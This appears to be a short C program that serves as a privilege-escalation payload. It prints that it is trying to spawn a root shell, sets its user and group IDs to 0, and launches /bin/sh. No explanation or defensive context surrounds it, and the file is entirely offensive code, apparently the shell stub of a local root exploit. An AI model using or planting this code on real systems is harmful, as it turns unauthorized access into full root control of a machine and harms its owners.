#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>

int main() {
    puts("[*] trying to spawn root shell");
    setuid(0);
    setgid(0);
    system("/bin/sh");
    return 0;
}
